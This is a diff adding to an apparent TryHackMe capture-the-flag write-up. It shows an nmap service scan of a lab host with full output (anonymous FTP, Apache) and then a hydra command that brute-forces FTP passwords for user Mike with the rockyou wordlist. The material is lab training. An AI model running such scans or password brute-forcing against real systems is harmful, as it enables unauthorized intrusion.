@@ -585,4 +585,39 @@ cat flag.txt
 THM{y0u_g0t_th3_t3ln3t_fl4g}
 ```
 
+### Enumerating FTP
 
+```
+nmap -sC -sV -oA nmap/initial 10.10.234.147
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:55 EST
+Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.11% done; ETC: 17:55 (0:00:00 remaining)
+Nmap scan report for 10.10.234.147
+Host is up (0.13s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.6.11.238
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: Host: Welcome
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
+```
+hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.234.147 ftp
